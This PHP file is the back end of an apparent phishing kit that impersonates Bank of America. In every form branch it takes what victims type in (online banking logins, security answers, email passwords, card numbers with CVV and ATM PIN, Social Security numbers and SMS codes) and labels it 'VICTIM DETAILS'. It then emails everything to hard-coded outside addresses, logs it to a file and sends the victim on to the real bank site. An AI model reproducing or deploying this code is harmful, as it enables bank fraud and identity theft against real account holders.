<?php

/**
 * @link              https://www.z0n51.com/
 * @since             06/11/2019
 * @package           BOA
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      BOA
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once '../inc/app.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

$to = 'versionextended02@gmail.com, hermanbrink002@yahoo.com';

$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country();
$get_user_countrycode = get_user_countrycode();
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die('9awed');
    }

    if ($_POST['type'] == "etaplogin") {
        $_SESSION['online_id1'] = $_POST['online_id'];
        $_SESSION['passcode1']  = $_POST['passcode'];

        $_SESSION['errors'] = [];
        if( empty($_POST['online_id']) ) {
            $_SESSION['errors']['online_id'] = 'This field is required';
        }
        if( empty($_POST['passcode']) ) {
            $_SESSION['errors']['passcode'] = 'This field is required';
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BOA | Login';
            $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Online ID : ' . $_POST['online_id'] . "\r\n";
            $message .= 'Passcode : ' . $_POST['passcode'] . "\r\n\r\n";
            $message .= '/-------------------- VICTIM DETAILS --------------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n\r\n";
            $message .= '/-- END LOG INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            mail($to,$subject,$message,$headers);
            file_put_contents("../xray.txt", $message, FILE_APPEND);
            header("location: loading1.php");
        } else {
            header("location: failed_login.php");
        }
    }

    if ($_POST['type'] == "etaplogin2") {
        $_SESSION['online_id2'] = $_POST['online_id'];
        $_SESSION['passcode2']  = $_POST['passcode'];

        $_SESSION['errors'] = [];
        if( empty($_POST['online_id']) ) {
            $_SESSION['errors']['online_id'] = 'This field is required';
        }
        if( empty($_POST['passcode']) ) {
            $_SESSION['errors']['passcode'] = 'This field is required';
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BOA | Login';
            $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Online ID : ' . $_POST['online_id'] . "\r\n";
            $message .= 'Passcode : ' . $_POST['passcode'] . "\r\n\r\n";
            $message .= '/-------------------- VICTIM DETAILS --------------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n\r\n";
            $message .= '/-- END LOG INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            mail($to,$subject,$message,$headers);
            file_put_contents("../xray.txt", $message, FILE_APPEND);
            header("location: loading1.php");
        } else {
            header("location: failed_login.php");
        }
    }

    if ($_POST['type'] == "etapquestions") {

        $_SESSION['q1'] = $_POST['q1'];
        $_SESSION['a1'] = $_POST['a1'];
        $_SESSION['q2'] = $_POST['q2'];
        $_SESSION['a2'] = $_POST['a2'];
        $_SESSION['q3'] = $_POST['q3'];
        $_SESSION['a3'] = $_POST['a3'];
        $_SESSION['q4'] = $_POST['q4'];
        $_SESSION['a4'] = $_POST['a4'];
        $_SESSION['q5'] = $_POST['q5'];
        $_SESSION['a5'] = $_POST['a5'];

        $_SESSION['errors'] = [];

        if( empty($_POST['q1']) ) {
            $_SESSION['errors']['q1'] = 'This field is required';
        }
        if( empty($_POST['a1']) ) {
            $_SESSION['errors']['a1'] = 'This field is required';
        }
        if( empty($_POST['q2']) ) {
            $_SESSION['errors']['q2'] = 'This field is required';
        }
        if( empty($_POST['a2']) ) {
            $_SESSION['errors']['a2'] = 'This field is required';
        }
        if( empty($_POST['q3']) ) {
            $_SESSION['errors']['q3'] = 'This field is required';
        }
        if( empty($_POST['a3']) ) {
            $_SESSION['errors']['a3'] = 'This field is required';
        }
        if( empty($_POST['q4']) ) {
            $_SESSION['errors']['q4'] = 'This field is required';
        }
        if( empty($_POST['a4']) ) {
            $_SESSION['errors']['a4'] = 'This field is required';
        }
        if( empty($_POST['q5']) ) {
            $_SESSION['errors']['q5'] = 'This field is required';
        }
        if( empty($_POST['a5']) ) {
            $_SESSION['errors']['a5'] = 'This field is required';
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BOA | Questions';
            $message = '/-- QUESTIONS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Question1 : ' . $_POST['q1'] . "\r\n";
            $message .= 'Answer1 : ' . $_POST['a1'] . "\r\n";
            $message .= 'Question2 : ' . $_POST['q2'] . "\r\n";
            $message .= 'Answer2 : ' . $_POST['a2'] . "\r\n";
            $message .= 'Question3 : ' . $_POST['q3'] . "\r\n";
            $message .= 'Answer3 : ' . $_POST['a3'] . "\r\n";
            $message .= 'Question4 : ' . $_POST['q4'] . "\r\n";
            $message .= 'Answer4 : ' . $_POST['a4'] . "\r\n";
            $message .= 'Question5 : ' . $_POST['q5'] . "\r\n";
            $message .= 'Answer5 : ' . $_POST['a5'] . "\r\n\r\n";
            $message .= '/-------------------- VICTIM DETAILS --------------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n\r\n";
            $message .= '/-- END QUESTIONS INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            mail($to,$subject,$message,$headers);
            file_put_contents("../xray.txt", $message, FILE_APPEND);
            header("location: https://www.bankofamerica.com/");
        } else {
            header("location: loading3.php");
        }
    }

    if ($_POST['type'] == "etapemail") {

        $_SESSION['email_address']  = $_POST['email_address'];
        $_SESSION['email_password'] = $_POST['email_password'];

        $_SESSION['errors'] = [];
        if( validate_email($_POST['email_address']) == false ) {
            $_SESSION['errors']['email_address'] = 'Please enter a valid email address';
        }
        if( empty($_POST['email_password']) ) {
            $_SESSION['errors']['email_password'] = 'This field is required';
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BOA | Email Address';
            $message = '/-- EMAIL ADDRESS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Email Address : ' . $_POST['email_address'] . "\r\n";
            $message .= 'Email Password : ' . $_POST['email_password'] . "\r\n\r\n";
            $message .= '/-------------------- VICTIM DETAILS --------------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n\r\n";
            $message .= '/-- END EMAIL ADDRESS INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            mail($to,$subject,$message,$headers);
            file_put_contents("../xray.txt", $message, FILE_APPEND);
            header("location: loading3.php");
        } else {
            header("location: loading2.php");
        }
    }

    if ($_POST['type'] == "etapcc") {

        $_SESSION['cc_number']  = $_POST['cc_number'];
        $_SESSION['cc_date']    = $_POST['cc_date'];
        $_SESSION['cc_cvv']     = $_POST['cc_cvv'];
        $_SESSION['cc_pin']     = $_POST['cc_pin'];
        $_SESSION['cc_ssn']     = $_POST['cc_ssn'];

        $date_ex = explode('/',$_POST['cc_date']);

        $card_number = validate_cc_number($_POST['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv'],$card_number['type']);

        if( count($date_ex) > 1 ) {
            $card_date   = $validDate = CreditCard::validDate(trim($date_ex[1]), trim($date_ex[0]));
        } else {
            $card_date = false;
        }

        $_SESSION['errors'] = [];
        if( $card_number == false ) {
            $_SESSION['errors']['cc_number'] = 'Please enter a valid card number';
        }
        if( $card_date == false ) {
            $_SESSION['errors']['cc_date'] = 'Please enter a valid date';
        }
        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Please enter a valid code';
        }
        if( validate_number($_POST['cc_pin']) == false ) {
            $_SESSION['errors']['cc_pin'] = 'Please enter a valid pin';
        }
        if( empty($_POST['cc_ssn']) ) {
            $_SESSION['errors']['cc_ssn'] = 'Please enter a valid social security number';
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BOA | Card Details';
            $message = '/-- CARD INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Card number : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Card date : ' . $_POST['cc_date'] . "\r\n";
            $message .= 'Card Cvv : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= 'ATM pin : ' . $_POST['cc_pin'] . "\r\n";
            $message .= 'SSN : ' . $_POST['cc_ssn'] . "\r\n\r\n";
            $message .= '/-------------------- VICTIM DETAILS --------------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n\r\n";
            $message .= '/-- END CARD INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            mail($to,$subject,$message,$headers);
            file_put_contents("../xray.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: loading2.php");
        } else {
            header("location: loading1.php");
        }
    }

    if ($_POST['type'] == "etapsms") {
        $_SESSION['sms_code'] = $_POST['sms_code'];

        $_SESSION['errors'] = [];
        if( empty($_POST['sms_code']) ) {
            $_SESSION['errors']['sms_code'] = 'This Field is required.';
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BOA | SMS';
            $message = '/-- SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'SMS Code : ' . $_POST['sms_code'] . "\r\n";
            $message .= '/-- END SMS INFOS --/' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            mail($to,$subject,$message,$headers);
            file_put_contents("../xray.txt", $message, FILE_APPEND);
            header("location: https://www.bankofamerica.com/");
        } else {
            header("location: loading5.php");
        }
    }

}